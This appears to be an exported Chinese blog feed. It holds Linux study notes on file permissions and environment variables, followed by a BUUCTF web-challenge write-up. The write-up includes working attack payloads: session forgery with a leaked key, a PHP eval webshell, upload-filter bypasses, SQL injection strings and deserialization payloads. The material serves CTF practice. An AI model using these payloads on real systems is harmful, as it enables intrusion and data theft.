-G选项则将该组添加到用户的属组的列表里，不会影响默认组。 7.2.3 修改组groupmod命令可以修改已有组的GID（加-g选项）或组名（加-n选项）。 # /usr/sbin/groupmod -n sharing shared # tail /etc/group haldaemon:x:68:7.3 xfs:x:43: gdm:x:42: rich:x:500: mama:x:501: katie:x:502: jessica:x:503: mysql:x:27: test:x:504: sharing:x:505:test,rich 7.3 理解文件权限7.3.1 使用文件权限符myh@VM-16-11-debian:/tmp/test$ ls -alF total 36 drwxr-xr-x 2 root root 4096 Jan 25 14:29 ./ drwxrwxrwt 9 root root 20480 Feb 8 06:43 ../ -rw-r--r-- 1 root root 0 Jan 25 14:28 cho -rw-r--r-- 1 root root 22 Jan 25 14:29 makefile -rw-r--r-- 1 root root 68 Jan 23 20:14 test1.txt 输出结果的第一个字段就是描述文件和目录权限的编码。这个字段的第一个字符代表了对象的类型： -代表文件 d代表目录 l代表链接 c代表字符型设备 b代表块设备 n代表网络设备 之后有3组三字符的编码。每一组定义了3种访问权限： r代表对象是可读的 w代表对象是可写的 x代表对象是可执行的 若没有某种权限，在该权限位会出现单破折线。 这3组权限分别对应对象的3个安全级别： 对象的属主 对象的属组 系统其他用户 对应如下： rwx：文件的属主（设为登录名rich） rwx：文件的属组（设为组名rich） r-x：系统上其他人。 说明登录名为rich的用户可以读取、写入以及执行这个文件（可以看作有全部权限）。类似地， rich组的成员也可以读取、写入和执行这个文件。然而不属于rich组的其他用户只能读取和执行这个文件： w被单破折线取代了，说明这个安全级别没有写入权限。 7.3.2 默认文件权限umask命令用来设置所创建文件和目录的默认权限。 $ touch newfile $ ls -al newfile -rw-r--r-- 1 rich rich 0 Sep 20 19:16 newfile touch命令用分配给的用户账户的默认权限创建了这个文件。 umask命令可以显示和设置这个默认权限。 $ umask 0022 $ 第一位代表了一项特别的安全特性，叫作粘着位（ sticky bit）。这部分内容会在7.5节详述。 后面的3位表示文件或目录对应的umask八进制值。要理解umask是怎么工作的，得先理解八进制模式的安全性设置。 八进制模式的安全性设置先获取这3个rwx权限的值，然后将其转换成3位二进制值，用一个八进制值来表示。在这个二进制表示中，每个位置代表一个二进制位。因此，如果读权限是唯一置位的权限，权限值就是r–，转换成二进制值就是100，代表的八进制值是4。 Linux系统上默认的八进制的umask值是0022，而我所创建的文件的八进制权限却是644，这是如何得来的呢？ umask值只是个掩码，它会屏蔽掉不想授予该安全级别的权限。要把umask值从对象的全权限值中减掉。文件的全权限的值是666（所有用户都有读和写的权限）；目录的则是777（所有用户都有读、写、执行权限）。 在上例中，文件一开始的权限是666， 减去umask值022之后， 剩下的文件权限就成了644。 可以用umask命令为默认umask设置指定一个新值： $ umask 026 $ touch newfile2 $ ls -l newfile2 -rw-r----- 1 rich rich 0 Sep 20 19:46 newfile2 ​ 7.4 改变安全性设置如果已经创建了一个目录或文件，需要改变它的安全性设置，在Linux系统上有一些工具能够完成这项任务。 7.4.1 改变权限chmod命令用来改变文件和目录的安全性设置。 chmod options mode file mode参数可以使用八进制模式或符号模式进行安全性设置。 一般用八进制模式就可以了。 $ chmod 760 newfile $ ls -l newfile -rwxrw---- 1 rich rich 0 Sep 20 19:16 newfile options为chmod命令提供了另外一些功能。 -R选项可以让权限的改变递归地作用到文件和子目录。 7.4.2 改变所属关系chown命令用来改变文件的属主，chgrp命令用来改变文件的默认属组。 chown options owner[.group] file 可用登录名或UID来指定文件的新属主。 # chown dan newfile # ls -l newfile -rw-rw-r-- 1 dan rich 0 Sep 20 19:16 newfile chown命令也支持同时改变文件的属主和属组 ： # chown dan.shared newfile # ls -l newfile -rw-rw-r-- 1 dan shared 0 Sep 20 19:16 newfile 如果Linux系统采用和用户登录名匹配的组名，可以只用一个条目就改变二者： # chown test. newfile # ls -l newfile -rw-rw-r-- 1 test test 0 Sep 20 19:16 newfile chown命令采用一些不同的选项参数。 -R选项配合通配符可以递归地改变子目录和文件的所属关系。 -h选项可以改变该文件的所有符号链接文件的所属关系。 说明 只有root用户能够改变文件的属主。任何属主都可以改变文件的属组，但前提是属主必须是原属组和目标属组的成员。 $ chgrp shared newfile $ ls -l newfile -rw-rw-r-- 1 rich shared 0 Sep 20 19:16 newfile 用户账户必须是这个文件的属主，除了能够更换属组之外，还得是新组的成员。 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"Linux学习-第六章","slug":"Linux学习-第六章","date":"2022-02-04T08:54:45.000Z","updated":"2022-02-06T11:56:02.381Z","comments":true,"path":"posts/myh10013.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10013.html","excerpt":"","text":"第六章：使用Linux环境变量6.1 什么是环境变量bash shell用一个叫作环境变量（ environment variable）的特性来存储有关shell会话和工作环境的信息（这也是它们被称作环境变量的原因）。这项特性允许你在内存中存储数据，以便程序或shell中运行的脚本能够轻松访问到它们。这也是存储持久数据的一种简便方法。在bash shell中，环境变量分为两类： 全局变量 局部变量 6.1.1 全局环境变量全局环境变量对于shell会话和所有生成的子shell都是可见的。局部变量则只对创建它们的shell可见。全局环境变量对那些所创建的子shell需要获取父shell信息的程序来说非常有用。 系统环境变量基本上都是使用全大写字母，以区别于普通用户的环境变量。 查看全局变量，可以使用env或printenv命令： root@VM-16-11-debian:/# printenv SHELL=/bin/bash HISTSIZE=3000 LANGUAGE=en_US.utf8 JRE_HOME=/usr/local/java/jdk-16.0.1+9/jre HISTTIMEFORMAT=%F %T PWD=/ LOGNAME=root XDG_SESSION_TYPE=tty HOME=/root 要显示个别环境变量的值，可以使用printenv命令，但是不要用env命令: $ printenv HOME /home/Christine $ $ env HOME env: HOME: No such file or directory 也可以使用echo显示变量的值。在这种情况下引用某个环境变量的时候，必须在变量前面加上一个美元符（ $）: root@VM-16-11-debian:/# echo $HOME /root 在echo命令中，在变量名前加上$可不仅仅是要显示变量当前的值。它能够让变量作为命令行参数： root@VM-16-11-debian:/# ls $HOME disk.sh install.sh 6.1.2 局部环境变量局部环境变量只能在定义它们的进程中可见。事实上， Linux系统也默认定义了标准的局部环境变量。也可以定义自己的局部变量，这些变量被称为用户定义局部变量。 在Linux系统并没有一个只显示局部环境变量的命令。 set命令会显示为某个特定进程设置的所有环境变量，包括局部变量、全局变量以及用户定义变量。 $ set BASH=/bin/bash [...] BASH_ALIASES=() BASH_ARGC=() BASH_ARGV=() BASH_CMDS=() BASH_LINENO=() BASH_SOURCE=() [...] colors=/etc/DIR_COLORS my_variable='Hello World' [...] 通过printenv命令能看到的全局环境变量都出现在了set命令的输出中。但在set命令的输出中还有其他一些环境变量，即局部环境变量和用户定义变量。 说明 命令env、 printenv和set之间的差异很细微。 set命令会显示出全局变量、局部变量以及用户定义变量。它还会按照字母顺序对结果进行排序。 env和printenv命令同set命令的区别在于前两个命令不会对变量排序，也不会输出局部变量和用户定义变量。 6.2 设置用户定义变量可以在bash shell中直接设置自己的变量。本节将介绍怎样在交互式shell或shell脚本程序中创建自己的变量并引用它们。 6.2.1 设置局部用户定义变量启动了bash shell（或者执行一个shell脚本），就能创建在这个shell进程内可见的局部变量了。可以通过等号给环境变量赋值，值可以是数值或字符串。 root@VM-16-11-debian:~# bash //创建子进程 root@VM-16-11-debian:~# echo $myvar root@VM-16-11-debian:~# myvar=hello root@VM-16-11-debian:~# echo $myvar hello root@VM-16-11-debian:~# exit //退出子进程 exit root@VM-16-11-debian:~# echo $myvar //不可见其他进程的环境变量 现在每次引用my_variable 环境变量的值，只要通过$my_variable引用即可。 如果要给变量赋一个含有空格的字符串值，必须用引号来界定字符串的首和尾。 $ my_variable=Hello World -bash: World: command not found $ $ my_variable=\"Hello World\" $ $ echo $my_variable Hello World 没有单引号的话， bash shell会以为下一个词是另一个要执行的命令。注意，定义的局部环境变量用的是小写字母，而到目前为止你所看到的系统环境变量都是大写字母。 记住，变量名、等号和值之间没有空格，这一点非常重要。如果在赋值表达式中加上了空格，bash shell就会把值当成一个单独的命令： $ my_variable = \"Hello World\" -bash: my_variable: command not found 6.2.2 设置全局环境变量创建全局环境变量的方法是先创建一个局部环境变量，然后再把它导出到全局环境中。通过export命令来完成，变量名前面不需要加$。 root@VM-16-11-debian:~# echo $myvar root@VM-16-11-debian:~# myvar=\"I am global now\" root@VM-16-11-debian:~# export myvar root@VM-16-11-debian:~# bash //创建子shell root@VM-16-11-debian:~# echo $myvar I am global now root@VM-16-11-debian:~# exit exit root@VM-16-11-debian:~# echo $myvar I am global now 修改子shell中全局环境变量并不会影响到父shell中该变量的值： $ my_variable=\"I am Global now\" $ export my_variable $ $ echo $my_variable I am Global now $ $ bash $ $ echo $my_variable I am Global now $ $ my_variable=\"Null\" $ $ echo $my_variable Null $ $ exit exit $ $ echo $my_variable I am Global now 子shell甚至无法使用export命令改变父shell中全局环境变量的值： $ my_variable=\"I am Global now\" $ export my_variable $ $ echo $my_variable I am Global now $ $ bash $ $ echo $my_variable I am Global now $ $ my_variable=\"Null\" $ $ export my_variable $ $ echo $my_variable Null $ $ exit exit $ $ echo $my_variable I am Global now 尽管子shell重新定义并导出了变量my_variable，但父shell中的my_variable变量依然保留着原先的值。 6.3 删除环境变量可以用unset命令删除已经存在的环境变量。在unset命令中引用环境变量时，记住**不要使用$**。 root@VM-16-11-debian:~# echo $myvar I am global now root@VM-16-11-debian:~# unset myvar root@VM-16-11-debian:~# echo $myvar 窍门 在涉及环境变量名时，记住一点就行了：如果要用到变量，使用$；如果要操作变量不适用。这条规则的一个例外就是使用printenv显示某个变量的值。 如果你是在子进程中删除了一个全局环境变量，这只对子进程有效。该全局环境变量在父进程中依然可用。 6.4 设置 PATH 环境变量当在shell命令行界面中输入一个外部命令时， shell必须搜索系统来找到对应的程序。 PATH环境变量定义了用于进行命令和程序查找的目录。 root@VM-16-11-debian:~# echo $PATH /usr/local/java/jdk-16.0.1+9/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #PATH中的目录使用冒号分隔。 如果命令或者程序的位置没有包括在PATH变量中，那么如果不使用绝对路径的话， shell是没法找到的。如果shell找不到指定的命令或程序，它会产生一个错误信息： root@VM-16-11-debian:~# myprog -bash: myprog: command not found 若要添加新的搜索目录，只需引用原来的PATH值，然后再给这个字符串添加新目录就行了。 将目录加到PATH环境变量之后，就可以在虚拟目录结构中的任何位置执行程序。 $ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin: /sbin:/bin:/usr/games:/usr/local/games $ $ PATH=$PATH:/home/christine/Scripts $ $ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ games:/usr/local/games:/home/christine/Scripts $ $ myprog The factorial of 5 is 120. $ 窍门 如果希望子shell也能找到你的程序的位置，一定要记得把修改后的PATH环境变量导出。 这种对PATH变量的修改只能持续到退出或重启系统。这种效果并不能一直持续。 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"buuctf练习：21-30","slug":"buuctf练习：21-30","date":"2022-01-30T03:17:33.000Z","updated":"2022-02-10T01:54:33.779Z","comments":true,"path":"posts/myh10012.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10012.html","excerpt":"","text":"21.[HCTF 2018]admin刚开始还以为是二次注入，但是发现不行。随便注册个号进去后，发现更改密码的部分存在源码，下载后看到这样一段代码： //index.html {% include('header.html') %} {% if current_user.is_authenticated %} &lt;h1 class=\"nav\"&gt;Hello {{ session['name'] }}&lt;/h1&gt; {% endif %} {% if current_user.is_authenticated and session['name'] == 'admin' %} &lt;h1 class=\"nav\"&gt;hctf{xxxxxxxxx}&lt;/h1&gt; {% endif %} &lt;!-- you are not admin --&gt; &lt;h1 class=\"nav\"&gt;Welcome to hctf&lt;/h1&gt; {% include('footer.html') %} 可以看到根据session中的name值来确定是不是admin,所以想到flask session 伪造，而flask的session是在客户端的，因此可以尝试进行伪造，但是伪造需要密钥，发现密钥就在我们下载的文件夹里： 所以接下来先解密session，这里可以用一个脚本： #用法在终端输入：python session_decode.py your-session import sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload) if __name__ == '__main__': print(decryption(sys.argv[1].encode())) #解密得到：{'_fresh': True, '_id': b'd36b0289542c58199f0077265e16573dce66036e3543284e1c3b4be2fbeeb15674be6453b16bf51b3acbb744a96506026944dc1b663f8adb7673c5ebaceeb6be', 'csrf_token': b'16c4ef7f11713de97039735f894c40b4846df5de', 'image': b'j6il', 'name': '1', 'user_id': '11'} 然后把name的值改为admin，在使用密钥加密一下得到session值。加密脚本（也可以解密）： git clone https://github.com/noraj/flask-session-cookie-manager 然后使用命令： $ python{2,3} flask_session_cookie_manager{2,3}.py encode -s '.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d' -t '{\"number\":\"326410031505\",\"username\":\"admin\"}' 将加密后的session重新添加到cookie中得到flag： 22.[BJDCTF2020]Easy MD5这个题刚开始直接注啥也没有，看了一下响应头发现有东西： 搜索查到MD5()true参数漏洞，发现ffifdyop会造成漏洞： 输出的开头是’or’6xxxxxx 在数据库语句里就构成了select * from ‘admin’ where password= ‘’or’6xxxxxx ’ 变成永真式。然后来到levels91.php，查看源码看到： &lt;!-- $a = $GET['a']; $b = $_GET['b']; if($a != $b &amp;&amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --&gt; 就是简单的弱比较，绕过的答案有很多种。这里就用数组绕过:a[]=1&amp;b[]=2，进入到levell14.php： &lt;?php error_reporting(0); include \"flag.php\"; highlight_file(__FILE__); if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){ echo $flag; } 和上一个差不多，无非就是post传参以及转别为了强比较，同样可以使用上面的数组绕过，得到flag。 md5比较绕过： https://www.cnblogs.com/ainsliaea/p/15126218.html https://blog.csdn.net/CSDNiamcoming/article/details/108837347 23.[ZJCTF 2019]NiZhuanSiWei源码：https://github.com/CTFTraining/zjctf_2019_final_web_nizhuansiwei/ 考察的是PHP伪协议、以及反序列化的魔法函数。（重点是data协议容易忘记） &lt;?php $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\")){ echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; //会触发魔法函数__tostring } } else{ highlight_file(__FILE__); } ?&gt; 首先是text参数，但是我们没有其他的文件可以读，所以使用data协议： 条件： allow_url_fopen:on allow_url_include :on 作用：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 用法： data://text/plain, data://text/plain;base64, 相关伪协议i详细介绍：https://segmentfault.com/a/1190000018991087 所以payload:?text=data://text/plain,welcome to the zjctf，就可以满足第一个判断。然后就要读useless.php，如果直接读无法显示，所以伪协议读取：file=php://filter/read=convert.base64-encode/resource=useless.php，读到之后解密： &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } ?&gt; 要想读到flag，就把file赋值为flag.php，然后序列化作为参数password值传进去就好。 24.[SUCTF 2019]CheckIn又是一个文件上传题，不过又难倒我了。首先这个题有源，先来分析一下： 源码地址：https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn if (isset($_POST[\"upload\"])) { $tmp_name = $_FILES[\"fileUpload\"][\"tmp_name\"]; $name = $_FILES[\"fileUpload\"][\"name\"]; if (!$tmp_name) { die(\"filesize too big!\"); } if (!$name) { die(\"filename cannot be empty!\"); } //文件后缀不能有ph开头的，并且忽略了大小写 $extension = substr($name, strrpos($name, \".\") + 1); if (preg_match(\"/ph|htacess/i\", $extension)) { die(\"illegal suffix!\"); } //文件内容中不能有\"&lt;?\" if (mb_strpos(file_get_contents($tmp_name), \"&lt;?\") !== FALSE) { die(\"&amp;lt;? in contents!\"); } //exif_imagetype() 读取一个图像的第一个字节并检查其签名。可以利用利用GIF89a文件头绕过（对应jpg后缀） $image_type = exif_imagetype($tmp_name); if (!$image_type) { die(\"exif_imagetype:not image!\"); } 所以从上面的过滤我们可以知道要上传图片木马，制作一个图片木马shell.jpg： GIF89a &lt;script language='php'&gt;@eval($_POST['shell']);&lt;/script&gt; 但是蚁剑不能连接图片文件，所以还不能直接连，在这里就卡着了。看了别人的wp可以上传一个配置文件.user.ini GIF89a auto_prepend_file=shell.jpg 参考链接：https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html 使用条件： (1)服务器脚本语言为PHP (2)对应目录下面有可执行的php文件 (3)服务器使用CGI／FastCGI模式 .user.ini实际上就是一个可以由用户“自定义”的php.ini，我们可以自定义除了PHP_INI_SYSTEM以外的模式，在执行php代码之前，系统会对.user.ini先做一个执行，然后才执行其他的php文件。 我们这边利用.user,ini先执行auto_prepend_file函数，auto_prepend_file表示在php程序加载第一个php代码前加载的php文件，也就是先加载了shell.jpg里面的文件，即一句话木马。 把这两个文件上传之后就可以使用蚁剑连接了，这里记住访问的时index.php！这样才有用，就是使用条件的第二个。 25.[极客大挑战 2019]HardSQL这题要提前知道一些知识点： ^ 等同于 and （）来代替空格 like 来代替=号 首先尝试1' #，发现返回被逮住说明什么被过滤了，再次尝试1'#，可以了，说明过滤了空格，还有一些其他被过滤的自己试试就知道了。然后根据前面的提示可知返回的都是同一报错信息，类似true和false，尝试报错注入。 报错注入知识点：https://blog.csdn.net/silence1_/article/details/90812612 #payload： 1'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)# //爆破数据库名 1'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e),1)# //爆破表名 1'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1)# //爆破列名 1'^updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1)# //爆破数据，发现只有一半，用right函数输出另一半 1'^updatexml(1,concat(0x7e,(select(right((password),30))from(H4rDsq1)),0x7e),1)# //爆破另一段数据 #left() right() 函数， LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH) LEFT、RIGHT函数返回ARG最左边、右边的LENGTH个字符串，ARG可以是CHAR或BINARY STRING 这里注意，在爆破数据的时候，select(right((password),30))from(H4rDsq1)，这个表名绝对不可以打双引号!!! 26.[MRCTF2020]你传你🐎呢这个文件上传题目和上次那个checkin差不多也是修改配置文件。但是不知道为什么连正常图片都上传不了，好像只能上传一句话的图🤪 上传成功之后显示文件路径：/var/www/html/upload/3d785937f598842209769fd5c7df8958/2.jpg，但这里是绝对路径并不是我们直接添加到url后面的，一般都是/upload/3d785937f598842209769fd5c7df8958/2.jpg！ 接下来就是如何解析我们的jpg文件为PHP文件，那就是更改配置文件.htaccess: .htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。详细讲解见：https://blog.csdn.net/cmzhuang/article/details/53537591 我们需要用到的就是下面这个，所有jpg文件都会被当作php文件执行： ForceType application/x-httpd-php SetHandler application/x-httpd-php 这里在上传配置文件时注意抓包修改Content-Type: image/jpeg，否则上传不了： 之后直接连接jpg文件就可以了，flag在根目录： 27.[MRCTF2020]Ez_bypass这题比较简单，就是弱比较。直接给payload：/?gg[]=1&amp;id[]=2。然后post的数据为：passwd=1234567a😉 28.[网鼎杯 2020 青龙组]AreUSerialz读源码： &lt;?php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-&gt;process(); } public function process() { #这里是弱比较 if($this-&gt;op == \"1\") { $this-&gt;write(); } else if($this-&gt;op == \"2\") { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(\"Bad Hacker!\"); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(\"Too long!\"); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(\"Successful!\"); else $this-&gt;output(\"Failed!\"); } else { $this-&gt;output(\"Failed!\"); } } private function read() { $res = \"\"; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo \"[Result]: &lt;br&gt;\"; echo $s; } function __destruct() { #这个是强比较,可以绕过！ if($this-&gt;op === \"2\") $this-&gt;op = \"1\"; $this-&gt;content = \"\"; $this-&gt;process(); } } #这里检查是不是有不符合的ASCII码字符 function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } 思路很简单首先让op = 2，这样就通过了强比较并且绕过了弱比较。这里有一个不同的就是属性都是protect： private属性序列化的时候会引入两个\\x00，注意这两个\\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得很清楚了。同理，protected属性会引入\\x00*\\x00。 下面有两种方法可以绕过，第一种就是，可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示： &lt;?php class FileHandler { protected $op = 2; protected $filename = \"flag.php\"; protected $content =\"\"; } $A = new FileHandler(); $B = urlencode(serialize($A)); $C = str_replace('%00','\\\\00', $B); $D = str_replace('s','S',$C); echo $D; ?&gt; O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\\00%2A\\00op%22%3Bi%3A2%3BS%3A11%3A%22\\00%2A\\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\\00%2A\\00content%22%3BS%3A0%3A%22%22%3B%7D 另一种就是PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过： &lt;?php class FileHandler { public $op= 2; public $filename = \"flag.php\"; public $content = \"Hello World!\"; } $a = serialize(new FileHandler()); echo $a; ?&gt; O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";s:12:\"Hello World!\";} 传进去查看源码就得到flag了。 29.[GXYCTF2019]BabySQli这个SQL注入和之前的不太一样，考察的是联合注入。源码地址：https://github.com/imagin-sch/GXY_CTF/tree/master/Web/BabySqli 首先读取源码看到search.php,打开看到一段字符串：MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5，这个不是base64哦，这个是base32，这里讲一下大致区别： base32 只有大写字母和数字数字组成，或者后面有三个等号。 base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。 所以先base32解密然后base64解密，得到： select * from user where username = '$name' 可以看到这个直接告诉我们是从user表中读取信息，并且是根据username的字段值。 开始尝试注入，发现只有username为admin时才不会显示wrong user ，说明只能是admin，下面就是利用联合注入的一个特点：联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据。 mysql&gt; select * from salaries; +--------+--------+------------+------------+ | emp_no | salary | from_date | to_date | +--------+--------+------------+------------+ | 10001 | 5000 | 1986-06-26 | 9999-01-01 | | 10002 | 5100 | 1996-08-03 | 9999-01-01 | | 10003 | 5200 | 1995-12-03 | 9999-01-01 | | 10004 | 5300 | 1986-12-01 | 9999-01-01 | | 10005 | 5400 | 1989-09-12 | 9999-01-01 | | 10006 | 5500 | 1990-08-05 | 9999-01-01 | | 10007 | 5600 | 1989-02-10 | 9999-01-01 | | 10008 | 5700 | 1998-03-11 | 2000-07-31 | | 10009 | 5800 | 1985-02-18 | 9999-01-01 | | 10010 | 5900 | 1996-11-24 | 2000-06-26 | | 10010 | 6000 | 2000-06-26 | 9999-01-01 | | 10011 | 6100 | 1990-01-22 | 1996-11-09 | | 10012 | 5000 | 1992-12-18 | 9999-01-01 | | 10013 | 5100 | 1985-10-20 | 9999-01-01 | | 10014 | 5200 | 1993-12-29 | 9999-01-01 | | 10015 | 5300 | 1992-09-19 | 1993-08-22 | | 10016 | 5400 | 1998-02-11 | 9999-01-01 | | 10017 | 5500 | 1993-08-03 | 9999-01-01 | | 10018 | 5700 | 1987-04-03 | 1992-07-29 | | 10018 | 5600 | 1992-07-29 | 9999-01-01 | | 10019 | 5800 | 1999-04-30 | 9999-01-01 | | 10020 | 5900 | 1997-12-30 | 9999-01-01 | | 10021 | 6000 | 1988-02-10 | 2002-07-15 | | 10022 | 6100 | 1999-09-03 | 9999-01-01 | | 10023 | 5000 | 1999-09-27 | 9999-01-01 | | 10024 | 5100 | 1998-06-14 | 9999-01-01 | | 10025 | 5200 | 1987-08-17 | 1997-10-15 | | 10026 | 5300 | 1995-03-20 | 9999-01-01 | | 10027 | 5400 | 1995-04-02 | 9999-01-01 | | 10028 | 5500 | 1991-10-22 | 1998-04-06 | | 10029 | 5600 | 1991-09-18 | 1999-07-08 | | 10029 | 5700 | 1999-07-08 | 9999-01-01 | | 10030 | 5800 | 1994-02-17 | 9999-01-01 | +--------+--------+------------+------------+ 33 rows in set (0.00 sec) mysql&gt; select * from salaries where emp_no=10001 union select 999,9999,2022-02-09,9999-01-01; +--------+--------+------------+------------+ | emp_no | salary | from_date | to_date | +--------+--------+------------+------------+ | 10001 | 5000 | 1986-06-26 | 9999-01-01 | | 999 | 9999 | 2011 | 9997 | +--------+--------+------------+------------+ 2 rows in set (0.00 sec) 可以看到自己构造的数据已经显示出来了。但是再次读取数据的时候就没了，只是本次的临时虚拟数据。 接下来就可以直接构造拿flag了： name:1' union select 1,'admin','202cb962ac59075b964b07152d234b70'# password:123 #其中202cb962ac59075b964b07152d234b70是md5(123) 这里有个疑问为什么可以知道要md5加密？？？ 30.[GYCTF2020]Blacklist这道题和强网杯之前的随便注几乎一样，不同的就是最后一步。考察的是联合注入和Handler命令。 前面的注入命令如下： 1' order by 2# 1';show tables;# 1';show columns from FlagHere;# 如果你用到了select，会发现过滤了什么： return preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject); 这里就到了难点，我们不能用select，屏蔽了大小写绕过等。这里就考察了在Mysql中的一个等价命令handler，先看看这个的语法： #通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 HANDLER tbl_name OPEN [ [AS] alias] #通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] #通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ] #通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。 HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ] #关闭句柄 HANDLER tbl_name CLOSE 接下来具体展示一下： mysql&gt; show tables from test; +----------------+ | Tables_in_test | +----------------+ | departments | | dept_emp | | dept_manager | | employees | | salaries | +----------------+ 5 rows in set (0.00 sec) mysql&gt; handler salaries open; Query OK, 0 rows affected (0.00 sec) mysql&gt; handler salaries read first; +--------+--------+------------+------------+ | emp_no | salary | from_date | to_date | +--------+--------+------------+------------+ | 10001 | 5000 | 1986-06-26 | 9999-01-01 | +--------+--------+------------+------------+ 1 row in set (0.00 sec) mysql&gt; handler salaries close; Query OK, 0 rows affected (0.00 sec) 然后就可以构造payload得到flag： 1';handler FlagHere open;handler FlagHere read first;handler FlagHere 